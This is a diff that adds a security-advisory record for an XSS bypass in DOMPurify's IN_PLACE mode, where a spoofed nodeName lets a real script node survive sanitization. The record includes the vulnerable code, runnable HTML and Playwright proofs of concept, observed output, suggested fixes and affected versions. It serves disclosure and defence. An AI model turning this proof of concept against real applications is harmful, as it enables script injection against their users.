@@ -1,0 +1,403 @@
+advisory_id: GHSA-x4vx-rjvf-j5p4
+datasource_id: github_osv/GHSA-x4vx-rjvf-j5p4
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-x4vx-rjvf-j5p4/GHSA-x4vx-rjvf-j5p4.json
+aliases:
+  - CVE-2026-65901
+summary: |
+  DOMPurify: `IN_PLACE` mode trusts attacker-controlled `nodeName` on live non-form nodes, allowing script retention and XSS via attacker-supplied DOM objects
+  ## Summary
+
+  When `DOMPurify.sanitize(root, { IN_PLACE: true })` is called on an attacker-supplied live DOM node, `DOMPurify` still trusts `currentNode.nodeName` for non-`form` nodes in the main `_sanitizeElements` pipeline. A real `<script>` child node whose observable `nodeName` is attacker-controlled can therefore be misclassified as an allowed element and retained. When the sanitized tree is inserted into a live document, the script executes.
+
+  This affects current `3.4.6`. The recent `IN_PLACE` hardening work covers clobbered `form` handling and foreign-realm shadow/template traversal, but does not harden the main per-node element decision for hostile non-`form` live nodes.
+
+  ## Affected
+
+  - DOMPurify `3.4.6`
+  - Any caller that does `DOMPurify.sanitize(node, { IN_PLACE: true })` on attacker-supplied live DOM nodes
+  - Verified attacker-controlled node sources:
+    - same-origin `iframe` → live node passed by reference
+    - same-origin `window.open()` popup → live node passed by reference
+    - same-origin foreign node adopted into the host document via `document.adoptNode(node)` and then sanitized in-place
+
+  Not affected:
+
+  - String-input `DOMPurify.sanitize(dirtyString)`
+
+  ## Vulnerability details
+
+  ### Code paths
+
+  [A] — `_sanitizeElements` uses the instance-visible `nodeName` for the allow/forbid decision:
+
+  ```ts
+  const _sanitizeElements = function (currentNode: any): boolean {
+    ...
+    if (_isClobbered(currentNode)) {
+      _forceRemove(currentNode);
+      return true;
+    }
+
+    const tagName = transformCaseFunc(currentNode.nodeName);
+    ...
+    if (
+      FORBID_TAGS[tagName] ||
+      (!(...) && !ALLOWED_TAGS[tagName])
+    ) {
+      ...
+      _forceRemove(currentNode);
+      return true;
+    }
+    ...
+  };
+  ```
+
+  For non-`form` nodes, `_isClobbered(currentNode)` returns `false` early. The subsequent element decision therefore trusts `currentNode.nodeName` directly.
+
+  [B] — `_isClobbered` is `form`-specific:
+
+  ```ts
+  const _isClobbered = function (element: Element): boolean {
+    const realTagName = getNodeName ? getNodeName(element) : null;
+    if (typeof realTagName !== 'string') {
+      return false;
+    }
+
+    if (transformCaseFunc(realTagName) !== 'form') {
+      return false;
+    }
+
+    return (...);
+  };
+  ```
+
+  The hardening is intentionally scoped to `form`. Non-`form` nodes are not checked for divergence between the instance-visible property view and the trusted prototype getter view.
+
+  ### Why the bypass works
+
+  The attack does **not** depend on string HTML parsing. It depends on a hostile live DOM object crossing a trust boundary into `DOMPurify`'s `IN_PLACE` pipeline.
+
+  If the attacker controls a same-origin subcontext (`iframe` or popup), they can prepare a real DOM subtree there and then pass the live node object by reference to a host page that trusts `DOMPurify.sanitize(node, { IN_PLACE: true })` as its final sanitization step.
+
+  For the verified primitive below:
+
+  - the real child node is `<script>`
+  - its script text is attacker-controlled
+  - the observable `nodeName` is attacker-controlled and made to appear as `"DIV"`
+  - `_sanitizeElements` therefore classifies the real `<script>` child as an allowed element
+  - the real `<script>` survives in the sanitized tree and executes on insertion
+
+  This primitive survives:
+
+  - direct reference passing
+  - `document.adoptNode(node)` followed by `IN_PLACE`
+
+  It does **not** survive:
+
+  - `importNode`
+  - `cloneNode`
+
+  because those paths materialize a fresh node and discard the hostile object semantics.
+
+  ## Proof of concept
+
+  ### (1) Minimal — runnable in a single browser context
+
+  ```html
+  <!doctype html>
+  <html><body>
+  <script src="dist/purify.js"></script>
+  <script>
+    const foreign = window.open('about:blank', '_blank', 'noopener=no');
+
+    const host = foreign.document.createElement('div');
+    const script = foreign.document.createElement('script');
+    script.textContent = 'window.__pwned = 1';
+    Object.defineProperty(script, 'nodeName', {
+      value: 'DIV',
+      configurable: true,
+    });
+    host.appendChild(script);
+
+    DOMPurify.sanitize(host, { IN_PLACE: true });
+
+    console.log('output:', host.outerHTML);
+    // <div><script>window.__pwned = 1</script></div>
+
+    window.__pwned = 0;
+    document.body.appendChild(host);
+    console.log('handler fired:', window.__pwned === 1); // true
+  </script>
+  </body></html>
+  ```
+
+  ### (2) End-to-end — Playwright
+
+  ```js
+  const { chromium } = require('playwright');
+  const path = require('path');
+
+  (async () => {
+    const browser = await chromium.launch();
+    const page = await browser.newPage();
+    await page.goto('about:blank');
+    await page.addScriptTag({ path: path.resolve('dist/purify.js') });
+
+    const result = await page.evaluate(async () => {
+      window.__hits = [];
+
+      const foreign = window.open('about:blank', '_blank', 'noopener=no');
+      const host = foreign.document.createElement('div');
+      const script = foreign.document.createElement('script');
+      script.textContent = 'top.__hits.push("script-fired")';
+      Object.defineProperty(script, 'nodeName', {
+        value: 'DIV',
+        configurable: true,
+      });
+      host.appendChild(script);
+
+      DOMPurify.sanitize(host, { IN_PLACE: true });
+      document.body.appendChild(host);
+
+      return {
+        version: DOMPurify.version,
+        output: host.outerHTML,
+        fired: window.__hits.includes('script-fired'),
+      };
+    });
+
+    console.log(result);
+    await browser.close();
+  })();
+  ```
+
+  Observed:
+
+  - Chromium / Firefox / WebKit
+
+  ```js
+  {
+    version: '3.4.6',
+    output: '<div><script>top.__hits.push("script-fired")</script></div>',
+    fired: true
+  }
+  ```
+
+  ## Impact
+
+  ### Direct
+
+  XSS via retained real `<script>` nodes inside attacker-supplied live DOM objects.
+
+  Any consumer that uses `DOMPurify.sanitize(node, { IN_PLACE: true })` as a security boundary for live DOM objects supplied by a lower-trust same-origin subcontext is vulnerable.
+
+  The typical pattern is:
+
+  ```js
+  // attacker-controlled same-origin subcontext prepares a live node
+  const foreignNode = attackerFrame.contentWindow.makeNode();
+
+  // host treats DOMPurify as the last security gate
+  DOMPurify.sanitize(foreignNode, { IN_PLACE: true });
+  container.appendChild(foreignNode);
+  ```
+
+  If `foreignNode` is a hostile live DOM object whose real child is `<script>` but whose observable `nodeName` is attacker-controlled, the sanitized output still contains the real script node when re-inserted into the live document.
+
+  ### Indirect / second-order
+
+  - Applications that accept same-origin plugin / extension / widget DOM and rely on `IN_PLACE` as the final sanitization step
+  - Editor or design-tool architectures where lower-trust subcontexts submit live DOM subtrees to a higher-trust host for in-place sanitization
+
+  ## Suggested fix
+
+  Two minimal-risk options:
+
+  1. Stop trusting instance-visible `nodeName` for the element decision in `IN_PLACE`.
+
+  Use the cached prototype getter (or another trusted realm-safe primitive) for the allow/forbid decision, just as the recent hardening already does for selected root and shadow-root checks.
+
+  In other words, the main pipeline should not do:
+
+  ```ts
+  const tagName = transformCaseFunc(currentNode.nodeName);
+  ```
+
+  on hostile live objects.
+
+  2. Generalize hostile-node detection beyond `form`.
+
+  The current `_isClobbered()` logic is `form`-specific. A more defensive approach would reject or strictly sanitize any `IN_PLACE` node whose instance-visible critical properties diverge from the trusted prototype getter view, at least for:
+
+  - `nodeName`
+  - `attributes`
+  - `childNodes`
+
+  Either approach would close the verified primitive above.
+impacted_packages:
+  - purl: pkg:npm/dompurify
+    affected_versions: vers:npm/<=3.4.6
+    fixed_versions:
+    affected_packages:
+      - pkg:npm/dompurify@0.4.0
+      - pkg:npm/dompurify@0.4.2
+      - pkg:npm/dompurify@0.4.3
+      - pkg:npm/dompurify@0.4.4
+      - pkg:npm/dompurify@0.4.5
+      - pkg:npm/dompurify@0.6.0
+      - pkg:npm/dompurify@0.6.1
+      - pkg:npm/dompurify@0.6.2
+      - pkg:npm/dompurify@0.6.3
+      - pkg:npm/dompurify@0.6.4
+      - pkg:npm/dompurify@0.6.5
+      - pkg:npm/dompurify@0.6.6
+      - pkg:npm/dompurify@0.6.7
+      - pkg:npm/dompurify@0.7.0
+      - pkg:npm/dompurify@0.7.1
+      - pkg:npm/dompurify@0.7.2
+      - pkg:npm/dompurify@0.7.3
+      - pkg:npm/dompurify@0.7.4
+      - pkg:npm/dompurify@0.8.0
+      - pkg:npm/dompurify@0.8.1
+      - pkg:npm/dompurify@0.8.2
+      - pkg:npm/dompurify@0.8.3
+      - pkg:npm/dompurify@0.8.4
+      - pkg:npm/dompurify@0.8.5
+      - pkg:npm/dompurify@0.8.6
+      - pkg:npm/dompurify@0.8.7
+      - pkg:npm/dompurify@0.8.8
+      - pkg:npm/dompurify@0.8.9
+      - pkg:npm/dompurify@0.9.0
+      - pkg:npm/dompurify@1.0.0
+      - pkg:npm/dompurify@1.0.1
+      - pkg:npm/dompurify@1.0.2
+      - pkg:npm/dompurify@1.0.3
+      - pkg:npm/dompurify@1.0.4
+      - pkg:npm/dompurify@1.0.5
+      - pkg:npm/dompurify@1.0.6
+      - pkg:npm/dompurify@1.0.7
+      - pkg:npm/dompurify@1.0.8
+      - pkg:npm/dompurify@1.0.9
+      - pkg:npm/dompurify@1.0.10
+      - pkg:npm/dompurify@1.0.11
+      - pkg:npm/dompurify@2.0.0
+      - pkg:npm/dompurify@2.0.1
+      - pkg:npm/dompurify@2.0.2
+      - pkg:npm/dompurify@2.0.3
+      - pkg:npm/dompurify@2.0.4
+      - pkg:npm/dompurify@2.0.5
+      - pkg:npm/dompurify@2.0.6
+      - pkg:npm/dompurify@2.0.7
+      - pkg:npm/dompurify@2.0.8
+      - pkg:npm/dompurify@2.0.9
+      - pkg:npm/dompurify@2.0.10
+      - pkg:npm/dompurify@2.0.11
+      - pkg:npm/dompurify@2.0.12
+      - pkg:npm/dompurify@2.0.13
+      - pkg:npm/dompurify@2.0.14
+      - pkg:npm/dompurify@2.0.15
+      - pkg:npm/dompurify@2.0.16
+      - pkg:npm/dompurify@2.0.17
+      - pkg:npm/dompurify@2.1.0
+      - pkg:npm/dompurify@2.1.1
+      - pkg:npm/dompurify@2.2.0
+      - pkg:npm/dompurify@2.2.1
+      - pkg:npm/dompurify@2.2.2
+      - pkg:npm/dompurify@2.2.3
+      - pkg:npm/dompurify@2.2.4
+      - pkg:npm/dompurify@2.2.5
+      - pkg:npm/dompurify@2.2.6
+      - pkg:npm/dompurify@2.2.7
+      - pkg:npm/dompurify@2.2.8
+      - pkg:npm/dompurify@2.2.9
+      - pkg:npm/dompurify@2.3.0
+      - pkg:npm/dompurify@2.3.1
+      - pkg:npm/dompurify@2.3.2
+      - pkg:npm/dompurify@2.3.3
+      - pkg:npm/dompurify@2.3.4
+      - pkg:npm/dompurify@2.3.5
+      - pkg:npm/dompurify@2.3.6
+      - pkg:npm/dompurify@2.3.7
+      - pkg:npm/dompurify@2.3.8
+      - pkg:npm/dompurify@2.3.9
+      - pkg:npm/dompurify@2.3.10
+      - pkg:npm/dompurify@2.3.11
+      - pkg:npm/dompurify@2.3.12
+      - pkg:npm/dompurify@2.4.0
+      - pkg:npm/dompurify@2.4.1
+      - pkg:npm/dompurify@2.4.2
+      - pkg:npm/dompurify@2.4.3
+      - pkg:npm/dompurify@2.4.4
+      - pkg:npm/dompurify@2.4.5
+      - pkg:npm/dompurify@2.4.6
+      - pkg:npm/dompurify@2.4.7
+      - pkg:npm/dompurify@2.4.8
+      - pkg:npm/dompurify@2.4.9
+      - pkg:npm/dompurify@2.5.0
+      - pkg:npm/dompurify@2.5.1
+      - pkg:npm/dompurify@2.5.2
+      - pkg:npm/dompurify@2.5.3
+      - pkg:npm/dompurify@2.5.4
+      - pkg:npm/dompurify@2.5.5
+      - pkg:npm/dompurify@2.5.6
+      - pkg:npm/dompurify@2.5.7
+      - pkg:npm/dompurify@2.5.8
+      - pkg:npm/dompurify@2.5.9
+      - pkg:npm/dompurify@3.0.0
+      - pkg:npm/dompurify@3.0.1
+      - pkg:npm/dompurify@3.0.2
+      - pkg:npm/dompurify@3.0.3
+      - pkg:npm/dompurify@3.0.4
+      - pkg:npm/dompurify@3.0.5
+      - pkg:npm/dompurify@3.0.6
+      - pkg:npm/dompurify@3.0.7
+      - pkg:npm/dompurify@3.0.8
+      - pkg:npm/dompurify@3.0.9
+      - pkg:npm/dompurify@3.0.10
+      - pkg:npm/dompurify@3.0.11
+      - pkg:npm/dompurify@3.1.0
+      - pkg:npm/dompurify@3.1.1
+      - pkg:npm/dompurify@3.1.2
+      - pkg:npm/dompurify@3.1.3
+      - pkg:npm/dompurify@3.1.4
+      - pkg:npm/dompurify@3.1.5
+      - pkg:npm/dompurify@3.1.6
+      - pkg:npm/dompurify@3.1.7
+      - pkg:npm/dompurify@3.2.0
+      - pkg:npm/dompurify@3.2.1
+      - pkg:npm/dompurify@3.2.2
+      - pkg:npm/dompurify@3.2.3
+      - pkg:npm/dompurify@3.2.4
+      - pkg:npm/dompurify@3.2.5
+      - pkg:npm/dompurify@3.2.6
+      - pkg:npm/dompurify@3.2.7
+      - pkg:npm/dompurify@3.3.0
+      - pkg:npm/dompurify@3.3.1
+      - pkg:npm/dompurify@3.3.2
+      - pkg:npm/dompurify@3.3.3
+      - pkg:npm/dompurify@3.4.0
+      - pkg:npm/dompurify@3.4.1
+      - pkg:npm/dompurify@3.4.2
+      - pkg:npm/dompurify@3.4.3
+      - pkg:npm/dompurify@3.4.4
+      - pkg:npm/dompurify@3.4.5
+      - pkg:npm/dompurify@3.4.6
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/cure53/DOMPurify
+    reference_type:
+    reference_id:
+  - url: https://github.com/cure53/DOMPurify/security/advisories/GHSA-x4vx-rjvf-j5p4
+    reference_type:
+    reference_id:
+exploits: []
